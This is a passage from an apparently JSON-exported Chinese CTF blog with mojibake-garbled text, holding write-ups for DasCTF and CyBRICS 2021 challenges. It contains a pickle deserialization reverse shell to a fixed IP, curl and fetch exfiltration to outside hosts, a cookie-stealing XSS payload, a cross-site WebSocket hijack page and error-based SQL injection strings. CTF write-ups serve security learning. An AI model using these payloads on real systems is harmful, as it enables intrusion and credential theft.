æˆ–è€…æ„é€ post/getè¯·æ±‚åˆ°è‡ªå·±å¯ä»¥æ¥æ”¶åˆ°çš„å¹³å°ä¸Šï¼Œä¹Ÿéƒ½æ˜¯å¸¸è§„åšæ³•\nclass A: def __reduce__(self): cmd = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/175.24.73.30/2333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; s=\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;{}\u0026#39;).read()\u0026#34;.format(cmd) return (eval,(s,)) #reduceå¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸² def hello_world(request): request.session[\u0026#34;233\u0026#34;] = \u0026#34;2333\u0026#34; request.session[\u0026#34;a\u0026#34;] = A() return Response(\u0026#39;Hello World!\u0026#39;) æ„é€ è¯·æ±‚çš„è¯è¿˜æ˜¯è€æœ‹å‹~~ burp collaborator~~\ncurl \u0026#34;xxxxxx.burpcollaborator.net/`readflag`\u0026#34; å‚è€ƒï¼šwp\neasyjava java æ ¹æœ¬ä¸ä¼š\næ”¾ä¸ªå‚è€ƒé“¾æ¥ æºœäº†ï¼šwp1 wp2\n æœ€è¿‘åœ¨æ€»ç»“ååºåˆ—åŒ–æœ‰å…³çš„ä¸œè¥¿ï¼Œæƒ³æŠŠphp, python, javaçš„ååºåˆ—åŒ– åšè¿‡çš„ä¸œè¥¿æ€»ç»“æ€»ç»“ï¼Œä½†è¿˜æ˜¯æˆ‘æƒ³å¾—å¤ªç®€å•äº† ä¸€ä¸ªphpçš„ååºåˆ—åŒ–å°±æœ‰å¥½å¤šå¥½å¤šä¸œè¥¿ï¼ˆè£…æ­»ï¼‰\näº‰å–æ—©æ”¶å·¥å§ï¼Œè¿˜æœ‰upload, xss, csrf, sqli\u0026hellip;\u0026hellip;ç­‰ç€æ€»ç»“ è¿˜æœ‰è¶…çº§å¤šä¸œè¥¿è¦å­¦è¦çœ‹\nå­¦ä¹ å¥½è€¶ï¼Ïƒ`âˆ€Â´)\n","date":"2021-08-05T23:15:47+08:00","permalink":"https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/","section":"posts","tags":["wp","participate"],"title":"DasCTF0721 Wp"},{"categories":["CTF"],"contents":"Mic Check (Cyber, Baby, 50 pts)  Author: Vlad Roskov (@mrvos)\nThose organizers are changing game rules all the time! Thereâ€™s a flag there, and itâ€™s not that easy to capture.\nAlso be sure to join @cybrics Telegram chat for challenge-related announcements and contacting orgs in case all goes wrong\nAdded at 10:10 â€” looks like the little mic check trolling caused massive pain, Iâ€™ve untrolled the rules page :-) You can now copy-paste freely\n Scanner (rebyC, Baby, 50 pts)  Author: Mikhail Driagunov (@aethereternity)\nCheck out this cool new game!\nI heard they serve flags at level 5.\n ä¸éš¾ï¼Œå°±æ˜¯æ¯”è¾ƒé¸¡è´¼ æŠŠå¥½å¥½çš„å›¾ç‰‡å¼„æˆçŠ¹æŠ±çµç¶åŠé®é¢\né¦–å…ˆç”¨Gif SuperæŠŠå¸§é—´éš”è°ƒä¸º300msï¼Œç„¶åè£å‰ªå‡ºä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ† æ”¾å…¥GIFåŠ¨æ€å›¾ç‰‡åˆ†è§£ä¸­çœ‹ç»“æœ éƒ½æœ‰åœ¨çº¿å·¥å…·å°±å¾ˆæ–¹ä¾¿\næ‰€ä»¥è¿™ä¸ªç ´ç©æ„åˆ°åº•æ˜¯å•¥ï¼ŸçŒªï¼Ÿè¿˜æ˜¯åˆºçŒ¬ï¼Ÿ åˆ«çš„éƒ½è¿˜ç®—æ­£å¸¸å§ å°±æ˜¯éƒ½ä¸å¤ªåƒå…¶å® æœ‰star, goose, flag, flower, ring, house, bone\u0026hellip;. æœ€åä¸€ä¸ªæ˜¯äºŒç»´ç  æ¯”è¾ƒéº»çƒ¦\nå†ç¨å¾®è°ƒæ•´ä¸€ä¸‹å°ºå¯¸ï¼Œæ‰«æå°±è¡Œäº†rm -rfâ€™er (CTB, Baby, 166 pts)  Author: Vlad Roskov (@mrvos)\nAlarm! We accidentally did rm -rf /* on a very important server. Now all thatâ€™s left is one shell session.\nssh rmrfer@178.154.210.26 Password: sa7Neiyi Rescue the flag.txt file from one of the directories by only using your shell\nAdded at 13:45 â€” frequent question: yes, if you found flag.txt, the flag is right there, in the open, as plain text. Just read it. If youâ€™re not seeing the flag, try to find another method that will not hide info from you\n è¿™ä¸ªé¢˜ emmmmm åªè¦sshä¸€è¿æ¥å°±ä¼šè‡ªåŠ¨æ‰§è¡Œrm -rf /*çš„æŒ‡ä»¤ï¼Œå½“ååº”è¿‡æ¥çš„æ—¶å€™ç³»ç»Ÿå·²ç»åˆ çš„è¿lsæŒ‡ä»¤éƒ½ä¸å‰©äº†\nå…ˆè¯´éé¢„æœŸè§£å§ï¼šå½“è¾“å…¥è¿æ¥å¯†ç åç«‹åˆ»ctrl+c åªè¦å¤Ÿå¿« å°±æ‰§è¡Œä¸äº†rm -rf /*ï¼Œä¹‹åå°±å¯ä»¥é¡ºç•…çš„ç©¿æ¢­äºè¿™ä¸ªbuildboxä¹‹é—´æ‹¿flagäº†\né¢„æœŸè§£åˆ™æ˜¯è¿™æ ·çš„ï¼šå½“ç³»ç»Ÿæ‰§è¡Œåˆ é™¤å‘½ä»¤å å¾ˆå¤šå¤–éƒ¨æŒ‡ä»¤éƒ½è¢«åˆ é™¤ éœ€è¦é€šè¿‡ä»…å‰©çš„ä¸€äº›å†…ç½®å‡½æ•°å®Œæˆ\u0026quot;read\u0026quot;çš„åŠŸèƒ½ï¼›ä»ä¹‹å‰çš„æŠ¥é”™ä¿¡æ¯å¯çŸ¥ buildboxä½¿ç”¨çš„æ˜¯tcshï¼Œåœ¨tcshä¸­echo $\u0026lt;å‘½ä»¤ç›¸å½“äºreadå‡½æ•°ï¼Œè¯»å…¥æ ‡å‡†è¾“å…¥å¹¶è¾“å‡ºï¼›tcshä¸­åŠ æ‹¬å·çš„å‘½ä»¤éƒ½ä¼šåœ¨å­shellä¸­è¿è¡Œï¼›æ„é€ payload (echo \u0026quot;$\u0026lt;\u0026quot;) \u0026lt; /etc/ctf/flag.txtï¼Œå³ è¯»å–flag.txtå¹¶è¾“å‡º\nAd Network (Web, Baby, 50 pts)  Author: Alexander Menshchikov (@n0str)\nWe are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.\nAdnetwork website\nThere is a flag 1337 redirects deep into the network\u0026hellip;\n è¿™ä¸ªæˆ‘æ˜¯ä¸çŸ¥é“æ€ä¹ˆåšâ€¦â€¦é¡µé¢ä¸Šçš„ä»»ä½•é“¾æ¥éƒ¨åˆ†éƒ½æ˜¯è‡ªå·±é¡µé¢å†…çš„è·³è½¬ï¼Œæç¤ºçš„æ˜¯redirecté‡å®šå‘ï¼Œå¯æ˜¯æŠ“åŒ…åæ²¡æœ‰302 ä¹Ÿæ²¡æœ‰ä¸€ç›´åœ¨åšé‡å®šå‘å‘€ è¦æ€ä¹ˆçœ‹å‘¢ï¼Ÿ\nemmmm åœ¨æ¯”èµ›ç¬¬äºŒå¤©å†æ¬¡å°è¯•çš„æ—¶å€™ç”¨burpçš„è‡ªå¸¦çš„chromiumçš„æµè§ˆå™¨ï¼ˆä¹‹å‰æ˜¯çŸ¥é“è¿™ä¸ª ä½†æ˜¯æ²¡æœ‰ç”¨è¿‡ï¼‰æ¬¸ é¡µé¢å·¦ä¸Šè§’æ˜¾ç¤ºäº†ä¸€ä¸ªgifå›¾ è¿™ä¸ªå›¾åœ¨æ˜¨å¤©åšçš„æ—¶å€™çœ‹åˆ°ï¼Œ å†…å®¹æ˜¯ awesome ad from adnetworkï¼Œä½†æ˜¯edgeæµè§ˆå™¨åœ¨åŠ è½½è¿™ä¸ªå›¾çš„æ—¶å€™ä¼šè‡ªåŠ¨é˜»æ­¢ æˆ‘å•ç‹¬çœ‹äº†å†…å®¹ä¹Ÿæ²¡å‘ç°ä»€ä¹ˆç‰¹åˆ«çš„ å°±æ²¡æœ‰æ³¨æ„è¿™é‡Œã€‚äº‹åè§’åº¦çœ‹è¿™é‡Œ å…¶å®ä¸€ä¸ªGifå›¾è¢«é˜»æ­¢è¯·æ±‚åº”è¯¥æ˜¯å¾ˆåå¸¸çš„äº‹æƒ…ï¼Œåº”è¯¥é¦–å…ˆå¼•èµ·æ³¨æ„çš„\u0026hellip;\u0026hellip; ï¼ˆéƒ½æ€ªedge!!!\nç‚¹å‡»gifä¼šæœ‰å•ç‹¬çš„å¼¹çª—å‡ºæ¥ï¼Œæç¤ºé‡å®šå‘æ¬¡æ•°è¿‡å¤šï¼›çœ‹burpä¸­çš„æŠ“åŒ…è®°å½• ç¡®å®å¤šçš„ç¦»è°±ï¼ŒæŒ‰ç…§é¢˜ç›®ä¸­çš„æç¤º å¾—æœ‰1337å±‚ï¼Œå¾—ä¸Šä¸ªè„šæœ¬æ…¢æ…¢è·‘äº† è¿™ä¸ªæ¯”è¾ƒå¥½å¼„\nimport requests url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; for _ in range(1337): r = requests.get(url, allow_redirects=False) url = r.text[9:-18] print(url) emmm æ¯”è¾ƒæ…¢å…¶å® åº”è¯¥æœ‰åˆ«çš„çš„æ–¹å¼ï¼Ÿæœ€åçš„flagæ˜¯ cybrics{f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z}\næ¯”èµ›å®Œäº†çœ‹äº†åˆ«çš„wp è¿™å—å¯ä»¥ç”¨sessionè®¾å…è®¸é‡å®šå‘çš„æ¬¡æ•°ï¼Œè¿™æ ·æ›´æ–¹ä¾¿\nimport requests session = requests.Session() session.max_redirects = 1337 url = \u0026#34;http://adnetwork-cybrics2021.ctf.su/adnetwork\u0026#34; r = session.get(url, allow_redirects=True) print(r.text) print(r.url) Announcement (Web, Easy, 60 pts)  Author: Alexander Menshchikov (@n0str)\nLadies and gentlemen!\nAllow us to introduce a brand new project â€” âš The Flag\nAnnouncement website\n ç®€çº¦æ¼‚äº®çš„å‰ç«¯\næœ‰ä¸ªè¾“å…¥é‚®ç®±çš„æ¡†ï¼Œæäº¤ä¼šå‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼šdigest=xxxx\u0026amp;email=xxxx å°è¯•ä¸€ä¸ª1@1.comï¼Œé‡æ”¾çš„æ—¶å€™ç›´æ¥ä¿®æ”¹emailå€¼ä¼šæç¤ºInvalid digestï¼Œå‘ç°å…¶ä¸­digestçš„å€¼å°±æ˜¯md5(\u0026lsquo;1@1.com\u0026rsquo;) éšemailè€Œæ”¹å˜ï¼Œå°è¯•æ³¨å…¥\ndigest=76af11f3eaf7b12e72d7d88e4cf2ee01\u0026amp;email='or'1\t// å›æ˜¾æ­£å¸¸ æ— æŠ¥é”™ digest=c3593d255957d60d5d489ae682da8aee\u0026amp;email=1')#\t// æŠ¥é”™ï¼šSomething went wrong during database insert: Column count doesn't match value count at row 1 digest=5c07c683d062d17ec799fa177ce88058\u0026amp;email=1',1)#\t// æŠ¥é”™ï¼šSomething went wrong during database insert: Incorrect datetime value: '1' for column 'timestamp' at row 1 ç¡®å®šæ˜¯sqli å¹¶ä¸”å½“å‰è¡¨æœ‰ä¸¤åˆ— email+timestampï¼Œä½¿ç”¨çš„è¯­å¥åº”è¯¥æ˜¯è¿™ä¸ªå§ï¼Ÿ\ninsert into table_name (email, timestamp) values (email, now()); å¯åˆ©ç”¨çš„éƒ¨åˆ†æ˜¯å¯ä»¥æ’å…¥çš„emailï¼ŒæŠ¥é”™æ³¨å…¥\ndigest=e1e79bd6fafe38f7073ec1f3ef1513fa\u0026amp;email=1',1 or updatexml(1,concat(0x7e,database()),0))#\t// Something went wrong during database insert: XPATH syntax error: '~announcement' digest=c9f14624524736a74164cc6024fdefce\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='announcement')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~emails,logs' digest=94707222b90505ab0aa5e1fd3916e77d\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='announcement' and table_name='logs')),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~log' digest=66bf6db11d9bee8e897b874a430f5704\u0026amp;email=' or updatexml(1,concat(0x7e,(select group_concat(log) from logs)),0) or '\t// Something went wrong during database insert: XPATH syntax error: '~cybrics{1N53r7_0ld_900d_5ql}' æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œç»å…¸æŠ¥é”™æ³¨å…¥æµç¨‹ï¼šç¡®å®šå­—æ®µæ•°-\u0026gt;çˆ†æ•°æ®åº“å(announcement)-\u0026gt;è¡¨å(emails, logs)-\u0026gt;å­—æ®µå(log)-\u0026gt;å…·ä½“æ•°æ® æ‹¿flag\nMultichat (Web, Medium, 138 pts)  Author: Alexander Menshchikov (@n0str)\nYet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.\nTip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): \u0026ldquo;Hey, i forgot the flag. Can you remind me?\u0026rdquo;. Then admin will tell him the flag.\nMultichat website\nTeam token for the support call: p32vhJKrnx_hajUc8nLTFw\n èŠå¤©å®¤ï¼Œadminå’Œtech supportåœ¨ä¸€ä¸ªç§˜å¯†çš„èŠå¤©å®¤å†…ï¼ˆ10ä½æ•°å­—çš„æˆ¿é—´å·ï¼‰ï¼Œtech supportå¯ä»¥è®©adminç»™å‡ºflagï¼ˆåé¢é‚£ä¸ªteam token for the support callæ˜¯è¦ç”¨åˆ°å—è¿˜æ˜¯æ€ä¹ˆæ ·\næŠ“åŒ…ï¼Œçœ‹åˆ°äº†Connection: Upgrade Upgrade: websocketï¼Œè¿™ä¸ªèŠå¤©å®¤æ˜¯å»ºç«‹äº†ä¸€ä¸ªwebsocketè¿æ¥\nï¼ˆwebsocketè¿™å—çŸ¥è¯†å°è±¡ä¸­ä¹‹å‰æ¥è§¦è¿‡ä¸€æ¬¡ ä¹Ÿå°±ä¸€æ¬¡ ç›¸å…³é“¾æ¥è¿˜æ˜¯æ”¾åé¢\né“¾æ¥é‡Œçš„ä¸€ä¸ªcsrfæ”»å‡»çš„å®ä¾‹è·Ÿè¿™ä¸ªæœ‰ç‚¹åƒäº†\nä½†æ˜¯è¿™é‡Œçš„åˆä¸å¤ªä¸€æ ·ï¼Œwebsocketæœ€åˆå»ºç«‹æ—¶çš„httpéƒ¨åˆ† cookieä¸­æœ‰chatroomçš„idï¼Œè¿™ä¸ªå€¼æ˜¯æœªçŸ¥çš„ï¼ˆAdmin and tech support are members of a secret chat room.ï¼‰ï¼›å¦å¤–tech supportæ˜¯å…ˆä¼šå‘*â€˜Hey, i forgot the flag. Can you remind me?â€™*ï¼Œéœ€è¦çš„æ˜¯è§¦å‘ï¼ˆå¦‚æœå®ƒä¸ä¼šè‡ªå·±å‘è¿™ä¸€æ¡å†…å®¹çš„è¯ï¼‰å’Œç›‘å¬å®ƒçš„ä¿¡æ¯ ç„¶åæ•æ‰åˆ°å®ƒçš„ä¸‹ä¸€æ¡adminå‘é€çš„å†…å®¹ï¼Œæ‹¿åˆ°flag\nï¼ˆæ¯”èµ›çš„æ—¶å€™å°±æƒ³åˆ°è¿™é‡Œï¼Œå…·ä½“çš„å®ç°ä¸çŸ¥é“è¯¥æ€ä¹ˆå¼„äº†ï¼Œä»¥ä¸‹æ˜¯çœ‹äº†wpä¹‹åçš„å¤ç°ï¼‰\n5000ç«¯å£å¤„æœ‰Supporté¡µé¢ï¼Œtech supportåœ¨è¿™é‡Œå¯ä»¥è®¿é—®ä»»æ„çš„é¡µé¢å¹¶å»ºç«‹websocketå‘é€æ¶ˆæ¯ï¼Œä¸é™åˆ¶è·¨åŸŸ æ‰€ä»¥å¯ä»¥å°†è‡ªå·±çš„ç½‘ç«™å†™åˆ°è¿™é‡Œï¼Œsupportä¼šå¸¦ç€å®ƒçš„cookieï¼ˆå’Œadminåœ¨ä¸€ä¸ªæˆ¿é—´é‡Œ cookieæ˜¯æˆ¿é—´idï¼‰è¿‡æ¥è®¿é—®ï¼Œç„¶åå€ŸåŠ©jsçš„è„šæœ¬æ‹¿åˆ°å®ƒçš„cookieï¼›ä»¥ä¸‹æ˜¯æ¥è‡ªw\u0026amp;mçš„è„šæœ¬\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var conn; function connect() { conn = new WebSocket(\u0026#34;ws://multichat-cybrics2021.ctf.su/ws\u0026#34;); conn.onclose = function (evt) { var item = \u0026#34;\u0026#34;; if (evt.code === 1003) { item = `Status: ${evt.reason}`; } else { item = \u0026#34;Connection closed.\u0026#34;; } fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(item)) }; conn.onopen = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(\u0026#34;connected\u0026#34;)) }; conn.onmessage = function (evt) { fetch(\u0026#34;http://api.chara.pub:1337/aaa.txt?\u0026#34;+encodeURIComponent(evt.data)) }; function b(){ conn.send(\u0026#34;Hey, i forgot the flag. Can you remind me?\u0026#34;) } setTimeout(b,2000); } window.onload = function () { connect(); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;html\u0026gt; æˆ–è€…éé¢„æœŸè§£ï¼šåœ¨urléƒ¨åˆ†è¿›è¡Œxssï¼Œpayload: javascript:location.href='http://vps/?cookie='+document.cookieï¼ˆæ­¤å¤„ç”¨çš„æ˜¯burp collaboratorï¼‰ç›´æ¥å¯ä»¥è·å–æˆ¿é—´å·ï¼Œè¿å…¥æˆ¿é—´åå‘æ¶ˆæ¯å³å¯æ‹¿åˆ°flag\nå‚è€ƒï¼šHTML5 WebSocket | WebSocketå®‰å…¨é—®é¢˜åˆ†æ WebSocketæ–­å¼€åŸå› åˆ†æ | Request.mode ä½¿ç”¨ Fetch | WorkerOrGlobalScope.fetch() | Burpsuite Collaboratoræ¨¡å—è¯¦è§£ | Running Your Instance of Burp Collaborator Serverï¼ˆåˆ—å…¥å¾…å®Œæˆè®¡åˆ’\nASCII Terminal (Network, Baby, 116 pts)  Author: Artur Khanov (@awengar)\nAt 138.68.83.253:3333 you have an ASCII terminal. It really works, check with the id command\n ncè¿ä¸Šä»¥åå¯ä»¥çœ‹åˆ°ä¸€ä¸ªbash $ï¼Œé¢˜ç›®çš„æç¤ºæ˜¯\u0026quot;ASCII termial\u0026quot;\næŠŠè¦æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿè¡¨ç¤ºæˆè¿™ç§å½¢å¼åå‘é€å³å¯ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯linuxä¸‹çš„toiletå·¥å…·\ntoiletå¯ä»¥æŠŠå­—æ¯æ‹¼æˆç”¨å­—ç¬¦æˆ–å…¶ä»–æ–¹å¼è¡¨ç¤ºçš„æ›´å¤§çš„å­—æ¯ï¼Œå¯ä»¥å¸¦ä¸€äº›å‚æ•°æ¥æ§åˆ¶å­—ä½“ å­—å·ä»¥åŠæ ·å¼ æ¯”å¦‚\nå¯ä»¥ç©å‡ºå¾ˆå¤šèŠ±æ ·~\nä¹¦å½’æ­£é¢˜ï¼Œè¿™é‡Œä½¿ç”¨toilet -f bigascii9 +commandçš„å‘½ä»¤ç”Ÿæˆç»“æœï¼Œå°†ç©ºæ ¼æ¢ä¸º .å†å‘é€å³å¯\ntoilet -f bigascii9 ls \u0026gt; ls.txt cat ls.txt | nc 138.68.83.253 3333 \u0026gt; ls_result.txt toilet -f bigascii9 'cat flag.txt' \u0026gt; cat.txt cat cat.txt | nc 138.68.83.253 2333 \u0026gt; flag.txt ï¼ˆå€¼å¾—æ³¨æ„çš„æ˜¯ å¦‚æœç›´æ¥ä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ç”Ÿæˆç›¸åº”æ–‡ä»¶åç”¨vimç¼–è¾‘å™¨çš„%s/\\s/./gå‘½ä»¤æ¥è¿›è¡Œç©ºæ ¼çš„æ›¿æ¢ï¼Œä¼šå‡ºç°ä¸‹é¢è¿™æ ·çš„æƒ…å†µ é¦–éƒ¨å’Œå°¾éƒ¨éƒ½éœ€è¦æ‰‹åŠ¨ä¿®æ­£ä¸€ä¸‹\næœ€åflagï¼šcybrics{T3553R4C7_15_GOOD}\nâ€”â€”â€”â€”psï¼šåœ¨èµ›åçš„å®˜æ–¹youtubeç›´æ’­è®²è§£ä¸­å±•ç¤ºäº†è¿™ä¸ªascii terminalçš„æºç ï¼Œæ˜¯ä½¿ç”¨pythonç¼–å†™çš„ å¯¹è¿™ä¸ªterminalçš„è¿è¡Œæ„Ÿå…´è¶£çš„å¯ä»¥åˆ°å½•æ’­è§†é¢‘ä¸­çœ‹\nå‚è€ƒï¼šè°ƒçš®æ£è›‹çš„Linuxä¸‹æœ‰è¶£ç»ˆç«¯çš„åˆé›† | Linux Fun - å¦‚ä½•åœ¨ç»ˆç«¯ä¸­åˆ›å»ºASCIIæ–‡æœ¬æ¨ªå¹… | Neofetch - æ˜¾ç¤ºå…·æœ‰åˆ†å‘æ ‡å¿—çš„Linuxç³»ç»Ÿä¿¡æ¯\nLX-100 (Network, Easy, 192 pts)  Author: Vlad Roskov (@mrvos)\nWe were sitting at an SPbCTF meetup and tried to sniff some Wi-Fi traffic. Lol imagine, they have a DSLR camera that can broadcast a Wi-Fi access point.\nAnyway, we were discussing CyBRICS flags there, hope thereâ€™s no way to leak them.\nlx100.pcap\n ï¼ˆè¯´å®è¯ï¼ŒpacpåŒ…æ˜¯çœŸçš„ä¸ä¼šçœ‹TAT\né¦–å…ˆçœ‹åˆ°æœ‰HTTPçš„æµé‡ï¼Œè®¿é—®çš„æ˜¯http://192.168.54.1/cam.cgi?mode=getstateï¼Œè¿™æ˜¯Lumix GX80æ‘„åƒå¤´ï¼Œè§†é¢‘æµé€šè¿‡UDPä¼ è¾“ï¼›è¿½è¸ªUDPæµé‡ï¼Œå¯¼å‡ºæµé‡ å¹¶æ‰¹é‡æå–å‡ºå…¶ä¸­çš„jpgæ–‡ä»¶ ï¼ˆä»¥ä¸‹æ˜¯å®˜æ–¹ç»™å‡ºçš„è§£ ä½¿ç”¨äº†tsharkå·¥å…·ï¼ˆå³å‘½ä»¤è¡Œç‰ˆçš„wireshrkï¼ˆä½†æ˜¯è¿™ç§æ–¹æ³•æœ¬åœ°å¤ç°å¤±è´¥ å¯¼å‡ºçš„jpgæ— æ³•æ­£å¸¸è§£æ ä½†æ˜¯å®˜æ–¹è§†é¢‘ä¸­ç¡®å®è¿™æ ·å¯ä»¥æˆåŠŸ emmmm\ntshark -r lx100.pcap -Y 'udp.dstport == 60524' -Tfields -e data.data \u0026gt; hex.txt php -a foreach(file(\u0026quot;hex.txt\u0026quot;)as $i =\u0026gt; $ln) {file_put_contents(\u0026quot;frame$i.jpg\u0026quot;,hex2bin(trim($ln)));} ï¼ˆä»¥ä¸‹æ˜¯åœ¨åˆ«çš„wpä¸­çœ‹åˆ°çš„pyè„šæœ¬ï¼š å¯æˆåŠŸå¤ç° å¯¼å‡º455å¼ jpgå›¾\nimport pyshark cap = pyshark.FileCapture(\u0026#39;lx100.pcap\u0026#39;) count = 0 for packet in cap: if \u0026#34;UDP\u0026#34; in packet and int(packet[\u0026#39;udp\u0026#39;].srcport) == 65415: count = count + 1 udp_bytes = bytearray.fromhex(packet.data.data[packet.data.data.find(\u0026#39;ffd8ffdb\u0026#39;):]) file_out = open(\u0026#39;out_files/\u0026#39; + str(count) + \u0026#39;_packet.jpg\u0026#39;, \u0026#39;wb\u0026#39;) file_out.write(udp_bytes) æ”¾å¤§ å†æ”¾å¤§ æ¯ä¸€æ ¹ æœ€åçš„flagæ˜¯ cybrics{Lost_Secrets_In_The_AIr}\nlocalhost (Network, Hard, 267 pts)  Author: Vlad Roskov (@mrvos)\nRemember NET fleeks? Iâ€™ve pwned a box in another corporate network, and there is some peculiarly configured server near my foothold. Take a look.\nssh localhost@109.233.61.10 Password: ohx7eeQu Your team token \u0026gt; Sw0T5cecsfJfaKApOiKzsA\n å…ˆsshè¿ä¸Šçœ‹çœ‹æƒ…å†µï¼ˆå›¾ä¸­æœ‰ä¸€å¥å‘½ä»¤è¾“é”™äº† åº”è¯¥æ˜¯routes ç•™ä¸‹äº†è‹±è¯­ä¸å¥½çš„æ³ªæ°´\nè‡ªå¸¦python2 python3 nmapï¼Œå¹¶ä¸”æœ¬èº«å°±æ˜¯rootèº«ä»½ï¼Œæ‰«ä¸€ä¸‹å†…ç½‘ç½‘æ®µnmap -sS -Pn 10.193.10.7/24\nå‘ç°10.193.10.180çš„80ç«¯å£å¼€æ”¾ï¼Œç”¨curlè®¿é—®\næç¤ºFlag-containing-Records æ¥ç€è®¿é—®ä¸¤ä¸ªè¶…é“¾æ¥çš„å†…å®¹\ncurl 10.193.10.180/redis.confæ˜¯redisçš„é…ç½®æ–‡ä»¶ï¼Œå‡ ä¹æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯è¢«æ³¨é‡Šæ‰çš„ç¤ºä¾‹å†…å®¹ï¼Œæœ‰ç”¨çš„å°±å†…å®¹å¹¶ä¸å¤šï¼š\nbind 127.0.0.1 protected-mod yes port 6379 curl 10.193.10.180/sysctl.confä¹Ÿæ˜¯ç›¸å…³çš„é…ç½®æ–‡ä»¶ åªæœ‰ä¸€å¥æ²¡è¢«æ³¨é‡Š\nnet.ipv4.conf.all.route_localnet=1 æŸ¥googleï¼Œå‘ç°äº†è¿™äº›ï¼šnet.ipv4.conf.all.route_localnet=1 opens security issue #90259 | POC-2020-8558\næ˜¯ä¸€ä¸ªå»å¹´çˆ†å‡ºçš„cveï¼Œå…·ä½“çš„å†…å®¹ æˆå› ä»¥åŠèƒŒæ™¯çŸ¥è¯†ä¸å¤šèµ˜è¿° ä¸Šé¢çš„é“¾æ¥ä¸­å†™çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œæ‘˜å–å‡ æ®µï¼š\n In order to allow host processes to access NodePort services via the 127.0.0.1(localhost) address, kube-proxy sets the net.ipv4.conf.all.route_localnet=1 sysctl setting. According to the kernel documentation, this setting makes the kernel \u0026ldquo;not consider loopback addresses as martian\u0026rdquo; \u0026ndash; a consequence of which is that they could be accessed by other nodes on the network. That\u0026rsquo;s a big deal if you have sensitive unauthenticated services whose only protection is being bound to localhost!\n\u0026hellip;\u0026hellip;\nA normal node will never transmit a packet with a destination address of 127.0.0.1, because of RFC 1122. If a normal node receives a packet with a destination address of 127.0.0.1, it will ignore (drop) it, again because of RFC 1122. Setting net.ipv4.conf.all.route_localnet=1 changes that \u0026ndash; it allows 127.0.0.1 packets to be sent and received as if they were not special.\nSo, if an attacker has a local connection to a target node with net.ipv4.conf.all.route_localnet=1, the attacker can send it a packet with 127.0.0.1 as the destination address, and that target node will respond appropriately as if 127.0.0.1 were a totally normal address. The two most common ways to have a local connection to a target node today are to be on the same Ethernet network (broadcast domain) as the target, or to be a container running on the target.\nNote that when normally configured, Linux will not allow the attacker node to transmit normal packets destined for 127.0.0.1. This can be worked-around by reconfiguring the attacker\u0026rsquo;s Linux node (if they have root access), or by forging packets using a raw socket. Raw sockets require only the Linux kernel capability CAP_NET_RAW, which is given by default to unprivileged containers. This means that an attacker-controlled unprivileged container is capable of exploiting CVE-2020-8558.\n ï¼ˆä¸å¾—ä¸è¯´ipv4å½“åˆæŠŠæ•´ä¸ª127.0.0.0/8çš„åœ°å€éƒ½ç»™äº†æœ¬åœ°å›ç¯ç”¨çœŸçš„æ˜¯å¤ªæ…·æ…¨äº†\u0026hellip;\u0026hellip; åˆ°ipv6å°±åªæœ‰ä¸€ä¸ª:: 1\nåœ¨è¿™é‡Œç›´æ¥ç”¨pocæ‰“å³å¯ï¼Œå…³äºtest.pyå’Œpoc.pyè¿™é‡Œä¹Ÿæ‘˜å–ä¸€ä¸‹è¯´æ˜\n tst-2020-8558.py Simple Python script to test for CVE-2020-8558 by sending raw packets. This could be a scapy oneliner, but I wanted to add a little bit more of the comforts of home. It sends a packet to 127.0.0.1 via your target, and looks to see if there is a reply.\npoc-2020-8558.py Python script to exploit CVE-2020-8558 by allowing ordinary TCP or UDP client applications to communicate with a remote localhost IP via forged packets. Run this script, then use any normal TCP or UDP client (e.g. kubectl or nc) to connect to your fakedestination (198.51.100.1 by default). Note that the fakedestination needs to be an IP address that never responds to packets and your route to it must be over the same interface as you access your target. In the usual case, both fakedestination and target will be accessible via your default gateway interface, and this will be no big deal. Because this script uses raw sockets to send and receive the \u0026ldquo;localhost\u0026rdquo; packets, it works fine inside a normal unprivileged container.\n å› ä¸ºéœ€è¦nc æ‰€ä»¥å¦å¼€ä¸€ä¸ªshell\nå‚è€ƒï¼šwp | ä¸ºä»€ä¹ˆæ•´ä¸ª127.*ç½‘æ®µéƒ½è¢«æ‹¿æ¥å½“åšç¯å›åœ°å€äº†ï¼Ÿ\n æœ¬äººæ¯”è¾ƒèœï¼Œåªåšå‡ºæ¥äº†ç­¾åˆ°é¢˜å’Œå‡ ä¸ªwebï¼Œå…¶ä½™å‡ä¸ºèµ›åå¤ç›˜ï¼Œæ­¤å¤„æ˜¯å‚è€ƒwp\né“é˜»ä¸”é•¿å‘€ï¼Œæš‘å‡è¦å¥½å¥½åŠªåŠ›å’¯ (ã¤Ğ´âŠ‚) 